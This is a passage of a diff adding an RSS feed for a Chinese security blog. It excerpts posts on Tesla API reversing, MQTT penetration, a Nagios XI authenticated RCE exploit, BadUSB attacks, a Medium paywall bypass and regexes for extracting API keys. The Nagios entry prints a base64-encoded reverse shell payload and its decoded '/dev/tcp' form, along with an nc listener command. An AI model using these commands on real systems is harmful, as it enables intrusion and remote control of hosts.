+<p>在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hacking All The Cars之Tesla API分析与利用（上）]]></title>
+        <id>https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/</id>
+        <link href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/">
+        </link>
+        <updated>2020-10-15T00:49:18.000Z</updated>
+        <summary type="html"><![CDATA[<p>该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。</p>
+<h2 id="0x00-简介">0x00 简介</h2>
+<p>Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。</p>
+<p>最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：</p>
+<ol>
+<li>
+<p>挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。</p>
+</li>
+<li>
+<p>实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；</p>
+</li>
+<li>
+<p>熟悉Tesla业务流程，可以深入去挖掘漏洞；</p>
+</li>
+<li>
+<p>尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；</p>
+</li>
+<li>
+<p>个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；</p>
+</li>
+<li>
+<p>通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。</p>
+</li>
+<li>
+<p>记录下所有关于车的数据，进行数据分析。</p>
+</li>
+</ol>
+]]></summary>
+        <content type="html"><![CDATA[<p>该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。</p>
+<h2 id="0x00-简介">0x00 简介</h2>
+<p>Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。</p>
+<p>最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：</p>
+<ol>
+<li>
+<p>挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。</p>
+</li>
+<li>
+<p>实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；</p>
+</li>
+<li>
+<p>熟悉Tesla业务流程，可以深入去挖掘漏洞；</p>
+</li>
+<li>
+<p>尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；</p>
+</li>
+<li>
+<p>个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；</p>
+</li>
+<li>
+<p>通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。</p>
+</li>
+<li>
+<p>记录下所有关于车的数据，进行数据分析。</p>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[物联网安全之MQTT渗透实战]]></title>
+        <id>https://bacde.me/post/mqtt-security-part-two/</id>
+        <link href="https://bacde.me/post/mqtt-security-part-two/">
+        </link>
+        <updated>2020-09-13T03:20:42.000Z</updated>
+        <summary type="html"><![CDATA[<p>上一篇 <a href="https://bacde.me/post/mqtt-security-part-one/">物联网安全之MQTT协议安全 </a>主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。</p>
+<p>在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1599967523996.png" alt="mqtt应用场景" loading="lazy"></figure>
+<center>EMQ X Broker 场景</center>
+<h2 id="0x00-获取mqtt认证信息">0x00 获取MQTT认证信息</h2>
+<p>目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>上一篇 <a href="https://bacde.me/post/mqtt-security-part-one/">物联网安全之MQTT协议安全 </a>主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。</p>
+<p>在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1599967523996.png" alt="mqtt应用场景" loading="lazy"></figure>
+<center>EMQ X Broker 场景</center>
+<h2 id="0x00-获取mqtt认证信息">0x00 获取MQTT认证信息</h2>
+<p>目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[自己的一些漏洞分析文章汇总【含0day】]]></title>
+        <id>https://bacde.me/post/my-some-vulnerability-alert/</id>
+        <link href="https://bacde.me/post/my-some-vulnerability-alert/">
+        </link>
+        <updated>2020-08-23T01:04:27.000Z</updated>
+        <summary type="html"><![CDATA[<p>前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。<br>
+注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0day申请了cve编号，详情都发在sec-list。</p>
+<ol>
+<li><a href="https://nosec.org/home/detail/1543.html">【漏洞预警】pixie 在线图片编辑器全版本存在SSRF漏洞[0day]</a></li>
+<li><a href="https://nosec.org/home/detail/1555.html">【漏洞预警】Onethink 全版本SSRF漏洞[0day]</a></li>
+<li><a href="https://nosec.org/home/detail/1542.html">【漏洞预警】Struts2 最新命令执行漏洞S2-052[最新更新，PoC,漏洞绕过]</a></li>
+<li><a href="https://nosec.org/home/detail/1544.html">Cockpit CMS SSRF漏洞 0day</a></li>
+<li><a href="https://nosec.org/home/detail/1545.html">TPSHOP 多用户商城系统任意文件读取&amp;&amp;SSRF 0day</a></li>
+<li><a href="https://nosec.org/home/detail/1559.html">【漏洞预警】Metinfo 5.3.5- 5.3.13 SSRF漏洞[0day]</a></li>
+<li><a href="https://nosec.org/home/detail/1517.html">【漏洞预警】Metinfo 5.x.x版本 SQL注入漏洞</a></li>
+<li><a href="https://nosec.org/home/detail/1384.html">威胁情报预警：Elasticsearch勒索软件事件</a></li>
+<li><a href="https://nosec.org/home/detail/1389.html">威胁情报预警：Couchdb勒索事件</a></li>
+</ol>
+]]></summary>
+        <content type="html"><![CDATA[<p>前几年做的一些漏洞分析复现或预警的文章，后来做管理岗，仅对感兴趣的漏洞做分析，写文写的少了。今天整理了下，存个档。<br>
+注：由于国家政策限制，有一些只对外发了预警，详细的版本均发送给了监管机构。有一些访问404的是因为不方便公开细节。对于0day申请了cve编号，详情都发在sec-list。</p>
+<ol>
+<li><a href="https://nosec.org/home/detail/1543.html">【漏洞预警】pixie 在线图片编辑器全版本存在SSRF漏洞[0day]</a></li>
+<li><a href="https://nosec.org/home/detail/1555.html">【漏洞预警】Onethink 全版本SSRF漏洞[0day]</a></li>
+<li><a href="https://nosec.org/home/detail/1542.html">【漏洞预警】Struts2 最新命令执行漏洞S2-052[最新更新，PoC,漏洞绕过]</a></li>
+<li><a href="https://nosec.org/home/detail/1544.html">Cockpit CMS SSRF漏洞 0day</a></li>
+<li><a href="https://nosec.org/home/detail/1545.html">TPSHOP 多用户商城系统任意文件读取&amp;&amp;SSRF 0day</a></li>
+<li><a href="https://nosec.org/home/detail/1559.html">【漏洞预警】Metinfo 5.3.5- 5.3.13 SSRF漏洞[0day]</a></li>
+<li><a href="https://nosec.org/home/detail/1517.html">【漏洞预警】Metinfo 5.x.x版本 SQL注入漏洞</a></li>
+<li><a href="https://nosec.org/home/detail/1384.html">威胁情报预警：Elasticsearch勒索软件事件</a></li>
+<li><a href="https://nosec.org/home/detail/1389.html">威胁情报预警：Couchdb勒索事件</a></li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[物联网安全之MQTT协议安全]]></title>
+        <id>https://bacde.me/post/mqtt-security-part-one/</id>
+        <link href="https://bacde.me/post/mqtt-security-part-one/">
+        </link>
+        <updated>2020-08-18T14:29:08.000Z</updated>
+        <summary type="html"><![CDATA[<p>MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于实现的特点非常适合需要低功耗和网络带宽有限的IoT场景。比如遥感数据、汽车、智能家居、智慧城市、医疗医护等。</p>
+<h2 id="mqtt协议">MQTT协议</h2>
+<p>MQTT协议为大量计算能力有限，低带宽、不可靠网络等环境而设计，其应用非常广泛。目前支持的服务端程序也较丰富，其PHP，JAVA，Python，C，C#等系统语言也都可以向MQTT发送相关消息。 目前最新的版本为5.0版本，可以在https://github.com/mqtt/mqtt.github.io/wiki/servers   这个连接中看到支持MQTT的服务端软件。 其中hivemq中提到针对汽车厂商的合作与应用，在研究过程中会发现有汽车行业应用了MQTT协议。</p>
+<figure data-type="image" tabindex="1"><img src="https://p1.ssl.qhimg.com/t01f74a80563218bc7a.png" alt="" loading="lazy"></figure>
+<p>以下列举我们关心的几项：</p>
+<ol>
+<li>使用发布/订阅的消息模式，支持一对多的消息发布；</li>
+<li>消息是通过TCP/IP协议传输；</li>
+<li>简单的数据包格式；</li>
+<li>默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。</li>
+</ol>
+]]></summary>
+        <content type="html"><![CDATA[<p>MQTT 全称为 Message Queuing Telemetry Transport（消息队列遥测传输）是是ISO 标准(ISO/IEC PRF 20922)下基于发布/订阅范式的消息协议，由 IBM 发布。由于其轻量、简单、开放和易于实现的特点非常适合需要低功耗和网络带宽有限的IoT场景。比如遥感数据、汽车、智能家居、智慧城市、医疗医护等。</p>
+<h2 id="mqtt协议">MQTT协议</h2>
+<p>MQTT协议为大量计算能力有限，低带宽、不可靠网络等环境而设计，其应用非常广泛。目前支持的服务端程序也较丰富，其PHP，JAVA，Python，C，C#等系统语言也都可以向MQTT发送相关消息。 目前最新的版本为5.0版本，可以在https://github.com/mqtt/mqtt.github.io/wiki/servers   这个连接中看到支持MQTT的服务端软件。 其中hivemq中提到针对汽车厂商的合作与应用，在研究过程中会发现有汽车行业应用了MQTT协议。</p>
+<figure data-type="image" tabindex="1"><img src="https://p1.ssl.qhimg.com/t01f74a80563218bc7a.png" alt="" loading="lazy"></figure>
+<p>以下列举我们关心的几项：</p>
+<ol>
+<li>使用发布/订阅的消息模式，支持一对多的消息发布；</li>
+<li>消息是通过TCP/IP协议传输；</li>
+<li>简单的数据包格式；</li>
+<li>默认端口为TCP的1883，websocket端口8083，默认消息不加密。8883端口默认是通过TLS加密的MQTT协议。</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hacking All The Cars之CAN总线逆向]]></title>
+        <id>https://bacde.me/post/hacking-all-the-cars-can-bus-reverse/</id>
+        <link href="https://bacde.me/post/hacking-all-the-cars-can-bus-reverse/">
+        </link>
+        <updated>2020-07-27T23:28:10.000Z</updated>
+        <summary type="html"><![CDATA[<p>本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。</p>
+<h2 id="简介">简介</h2>
+<p>CAN(Controller Area Network)总线是制造业和汽车产业中使用的一种简单协议，为ISO国际标准化的串行通信协议。在现代汽车中的小型嵌入式系统和ECU能够使用CAN协议进行通信，其通信是采用的广播机制，与TCP协议中的UDP差不多。各个系统或ECU（电子控制单元）都可以收发控制消息。1996年起该协议成了美国轿车和轻型卡车的标准协议之一，但是直到2008年才成为强制标准（2001年成为欧洲汽车标准）。当然1996年之前的也有可能使用CAN总线。现在，汽车的电子组件均通过CAN总线连接，针对汽车的攻击最终也都会通过CAN总线来实现。对于研究汽车安全，CAN总线协议是必须要掌握的。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。</p>
+<h2 id="简介">简介</h2>
+<p>CAN(Controller Area Network)总线是制造业和汽车产业中使用的一种简单协议，为ISO国际标准化的串行通信协议。在现代汽车中的小型嵌入式系统和ECU能够使用CAN协议进行通信，其通信是采用的广播机制，与TCP协议中的UDP差不多。各个系统或ECU（电子控制单元）都可以收发控制消息。1996年起该协议成了美国轿车和轻型卡车的标准协议之一，但是直到2008年才成为强制标准（2001年成为欧洲汽车标准）。当然1996年之前的也有可能使用CAN总线。现在，汽车的电子组件均通过CAN总线连接，针对汽车的攻击最终也都会通过CAN总线来实现。对于研究汽车安全，CAN总线协议是必须要掌握的。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[免费查看Medium付费内容]]></title>
+        <id>https://bacde.me/post/medium-bypass-via-google-cache/</id>
+        <link href="https://bacde.me/post/medium-bypass-via-google-cache/">
+        </link>
+        <updated>2020-07-22T13:01:49.000Z</updated>
+        <summary type="html"><![CDATA[<p>Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。</p>
+<p>其实通过Google cache就可以绕过限制继续查看。</p>
+<p>例如我们要查看下面的文章，发现看不了。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1595423164903.png" alt="" loading="lazy"></figure>
+]]></summary>
+        <content type="html"><![CDATA[<p>Medium的文章有一些是需要花钱购买会员才可以看的，每个月有两次可以试看。超过则需要付费成为会员。</p>
+<p>其实通过Google cache就可以绕过限制继续查看。</p>
+<p>例如我们要查看下面的文章，发现看不了。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1595423164903.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[BIG IP CVE-2020-5902 漏洞检测和利用]]></title>
+        <id>https://bacde.me/post/big-ip-cve-2020-5902-check-poc/</id>
+        <link href="https://bacde.me/post/big-ip-cve-2020-5902-check-poc/">
+        </link>
+        <updated>2020-07-05T03:19:29.000Z</updated>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Nagiosxi的一个RCE漏洞利用脚本]]></title>
+        <id>https://bacde.me/post/nagiosxi-rce-1/</id>
+        <link href="https://bacde.me/post/nagiosxi-rce-1/">
+        </link>
+        <updated>2020-05-27T09:05:55.000Z</updated>
+        <summary type="html"><![CDATA[<p>登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。</p>
+<h2 id="简要信息">简要信息</h2>
+<p>版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的 <code>-</code> 去掉）<br>
+条件：登陆后<br>
+漏洞文件相关路径：/includes/components/xicore/export-rrd.php、includes/utils-rrdexport.inc.php<br>
+漏洞参数：step、start、end</p>
+<h2 id="环境">环境</h2>
+<p>python3<br>
+requests库，使用pip3安装即可。<code>python3 -m pip install requests</code></p>
+<h2 id="运行">运行</h2>
+<ol>
+<li>首先在远程机器上监听端口，用于反弹。命令：nc -l -v -p 4444</li>
+<li>python3 nagiox.py target   (注：需带协议，如http或https)</li>
+</ol>
+<p>另外，如果需要执行自己的命令，需要修改commond变量就可以了，这里也懒得改了。脚本中的命令<code>&quot;1|(echo+\&quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\&quot;|base64+-d+|sh+-i);#&quot;</code><br>
+其实就是执行的<code>bash -i &gt;&amp; /dev/tcp/192.168.1.20/4444 0&gt;&amp;1</code></p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1590571293255.png" alt="" loading="lazy"></figure>
+<h2 id="代码保存为py文件">代码（保存为py文件）</h2>
+]]></summary>
+        <content type="html"><![CDATA[<p>登陆后的，比较鸡肋。4月份发现的，一直放着，后来看官网更新了，直接发出来吧。另外官方还有一个明显的sql注入没修复。不过也是登陆后，感兴趣的可以去看一下。</p>
+<h2 id="简要信息">简要信息</h2>
+<p>版本： 5.6.13（5.6.11版本也存在问题，只需要把最后文件名字中的 <code>-</code> 去掉）<br>
+条件：登陆后<br>
+漏洞文件相关路径：/includes/components/xicore/export-rrd.php、includes/utils-rrdexport.inc.php<br>
+漏洞参数：step、start、end</p>
+<h2 id="环境">环境</h2>
+<p>python3<br>
+requests库，使用pip3安装即可。<code>python3 -m pip install requests</code></p>
+<h2 id="运行">运行</h2>
+<ol>
+<li>首先在远程机器上监听端口，用于反弹。命令：nc -l -v -p 4444</li>
+<li>python3 nagiox.py target   (注：需带协议，如http或https)</li>
+</ol>
+<p>另外，如果需要执行自己的命令，需要修改commond变量就可以了，这里也懒得改了。脚本中的命令<code>&quot;1|(echo+\&quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAvNDQ0NCAwPiYx\&quot;|base64+-d+|sh+-i);#&quot;</code><br>
+其实就是执行的<code>bash -i &gt;&amp; /dev/tcp/192.168.1.20/4444 0&gt;&amp;1</code></p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1590571293255.png" alt="" loading="lazy"></figure>
+<h2 id="代码保存为py文件">代码（保存为py文件）</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[通过sourcemap解压缩webpack 实战]]></title>
+        <id>https://bacde.me/post/unpack-webpack-via-sourcemap/</id>
+        <link href="https://bacde.me/post/unpack-webpack-via-sourcemap/">
+        </link>
+        <updated>2020-05-18T05:38:50.000Z</updated>
+        <summary type="html"><![CDATA[<p>现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环境中使用。这使得我们有了机会。</p>
+<p>在实际渗透过程中，许多网站还是存在这种情况。通常一般是配置了<code>devtool: 'source-map'</code> 。</p>
+<p>我们可以在js的文件名后面加上.map，如果在这种该文件，我们则可以通过工具解压缩webpack。</p>
+<p>或者当我们一般看到类似这样的代码时，也基本可以对其进行解压缩。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>现在许多网站都使用webpack对网站打包，许多前端框架也默认配置好webpack。这会在渗透测试或挖洞过程中带来一些麻烦。这让我们极其痛苦。但是开发者忽视起潜在风险，在线上环境使用了开发环境的配置，或者配置了sourcemap允许在生产环境中使用。这使得我们有了机会。</p>
+<p>在实际渗透过程中，许多网站还是存在这种情况。通常一般是配置了<code>devtool: 'source-map'</code> 。</p>
+<p>我们可以在js的文件名后面加上.map，如果在这种该文件，我们则可以通过工具解压缩webpack。</p>
+<p>或者当我们一般看到类似这样的代码时，也基本可以对其进行解压缩。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一些流行的云waf、cdn、lb的域名列表（80条）]]></title>
+        <id>https://bacde.me/post/some-waf-cdn-lb-list/</id>
+        <link href="https://bacde.me/post/some-waf-cdn-lb-list/">
+        </link>
+        <updated>2020-04-26T09:56:16.000Z</updated>
+        <summary type="html"><![CDATA[<p>在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以跳过端口检查，节省时间。</p>
+<p>以下列表主要收集了一些大型互联网企业（腾讯、百度、滴滴、字节跳动、360、阿里巴巴、美团、京东等），然后经过人工整理出来，有遗漏在所难免，欢迎大家补充。</p>
+<p>w.alikunlun.com<br>
+wsglb0.com<br>
+w.kunlunpi.com<br>
+elb.amazonaws.com<br>
+wswebpic.com<br>
+mig.tencent-cloud.net<br>
+cloud.tc.qq.com<br>
+qcloudcjgj.com<br>
+pop3.mxhichina.com</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以跳过端口检查，节省时间。</p>
+<p>以下列表主要收集了一些大型互联网企业（腾讯、百度、滴滴、字节跳动、360、阿里巴巴、美团、京东等），然后经过人工整理出来，有遗漏在所难免，欢迎大家补充。</p>
+<p>w.alikunlun.com<br>
+wsglb0.com<br>
+w.kunlunpi.com<br>
+elb.amazonaws.com<br>
+wswebpic.com<br>
+mig.tencent-cloud.net<br>
+cloud.tc.qq.com<br>
+qcloudcjgj.com<br>
+pop3.mxhichina.com</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一些提取api key的正则表达式]]></title>
+        <id>https://bacde.me/post/Extract-API-Keys-From-Regex/</id>
+        <link href="https://bacde.me/post/Extract-API-Keys-From-Regex/">
+        </link>
+        <updated>2020-04-14T02:41:38.000Z</updated>
+        <summary type="html"><![CDATA[<p>分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。<br>
+在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～</p>
+<pre><code>&quot;aliyun_oss_url&quot;: &quot;[\\w-.]\\.oss.aliyuncs.com&quot; 
+&quot;azure_storage&quot;: &quot;https?://[\\w-\.]\\.file.core.windows.net&quot;
+&quot;access_key&quot;: &quot;[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)&quot;
+&quot;secret_key&quot;: &quot;[Ss](ecret|ECRET)_?[Kk](ey|EY)&quot;
+&quot;slack_token&quot;: &quot;(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})&quot;</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<p>分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。<br>
+在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～</p>
+<pre><code>&quot;aliyun_oss_url&quot;: &quot;[\\w-.]\\.oss.aliyuncs.com&quot; 
+&quot;azure_storage&quot;: &quot;https?://[\\w-\.]\\.file.core.windows.net&quot;
+&quot;access_key&quot;: &quot;[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)&quot;
+&quot;secret_key&quot;: &quot;[Ss](ecret|ECRET)_?[Kk](ey|EY)&quot;
+&quot;slack_token&quot;: &quot;(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})&quot;</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一些临时邮箱服务网站]]></title>
+        <id>https://bacde.me/post/Temporary-mail-service/</id>
+        <link href="https://bacde.me/post/Temporary-mail-service/">
+        </link>
+        <updated>2020-04-13T13:15:12.000Z</updated>
+        <summary type="html"><![CDATA[<p>临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。</p>
+<h2 id="推荐使用的">推荐使用的：</h2>
+<p>https://t.odmail.cn<br>
+https://www.mohmal.com<br>
+http://od.obagg.com<br>
+http://onedrive.readmail.net<br>
+http://xkx.me</p>
+<h2 id="其它">其它</h2>
+]]></summary>
+        <content type="html"><![CDATA[<p>临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。</p>
+<h2 id="推荐使用的">推荐使用的：</h2>
+<p>https://t.odmail.cn<br>
+https://www.mohmal.com<br>
+http://od.obagg.com<br>
+http://onedrive.readmail.net<br>
+http://xkx.me</p>
+<h2 id="其它">其它</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Badusb 攻击之MacOSX系统实战]]></title>
+        <id>https://bacde.me/post/Badusb-Attack-On-Mac-OSX/</id>
+        <link href="https://bacde.me/post/Badusb-Attack-On-Mac-OSX/">
+        </link>
+        <updated>2020-04-05T13:58:23.000Z</updated>
+        <summary type="html"><![CDATA[<p>Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。</p>
+<p><a href="https://www.youtube.com/embed/VdbTwopR4iY">点此打开</a>观看一段演示视频，需fq。</p>
+<h2 id="利用场景">利用场景</h2>
+<p>说下本文中利用场景：</p>
+<ol>
+<li>混入企业内部，员工电脑未锁屏的情况下。在之前去过很多客户那里，大多数企业的员工离开电脑前不锁屏的情况,而且非常严重。</li>
+<li>对于无安全意识的员工进行攻击，如公司文员、前台、行政等，例如将usb贴上保密、照片等字样，并扔到显眼位置，以吸引人来捡并插入其电脑。</li>
+</ol>
+<p>针对Badusb攻击手段还有很多，利用场景也还有，这里仅列出与本文有关的部分。下面就让我们正式开始进入制作。</p>
+<h2 id="准备工作">准备工作</h2>
+<h3 id="硬件">硬件</h3>
+]]></summary>
+        <content type="html"><![CDATA[<p>Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。</p>
+<p><a href="https://www.youtube.com/embed/VdbTwopR4iY">点此打开</a>观看一段演示视频，需fq。</p>
+<h2 id="利用场景">利用场景</h2>
+<p>说下本文中利用场景：</p>
+<ol>
+<li>混入企业内部，员工电脑未锁屏的情况下。在之前去过很多客户那里，大多数企业的员工离开电脑前不锁屏的情况,而且非常严重。</li>
+<li>对于无安全意识的员工进行攻击，如公司文员、前台、行政等，例如将usb贴上保密、照片等字样，并扔到显眼位置，以吸引人来捡并插入其电脑。</li>
+</ol>
+<p>针对Badusb攻击手段还有很多，利用场景也还有，这里仅列出与本文有关的部分。下面就让我们正式开始进入制作。</p>
+<h2 id="准备工作">准备工作</h2>
+<h3 id="硬件">硬件</h3>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[搭建自己的CyberChef]]></title>
+        <id>https://bacde.me/post/build-own-cyberchef/</id>
+        <link href="https://bacde.me/post/build-own-cyberchef/">
+        </link>
+        <updated>2020-04-03T07:58:37.000Z</updated>
+        <summary type="html"><![CDATA[<p>CyberChef是一个很好很强大的程序,很实用。</p>
+<p>由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in CyberChef这个浏览器插件就更加方便。</p>
+<p>直接下载官方生成的包，下载地址：<a href="https://github.com/gchq/CyberChef/releases">https://github.com/gchq/CyberChef/releases</a></p>
+<p>我这里直接上传到github，并且启用github pages。然后绑定解析自己的域名即可线上访问。我这里搭建好的无google统计的地址：<a href="https://cyberchef.bacde.me">https://cyberchef.bacde.me</a></p>
+<p>接下来安装Open in CyberChef 这个chrome插件。插件地址:<a href="https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related">https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related</a></p>
+<p>这样就可以直接右键发送到自己的cyberchef，方便了很多。使用效果如下：</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>CyberChef是一个很好很强大的程序,很实用。</p>
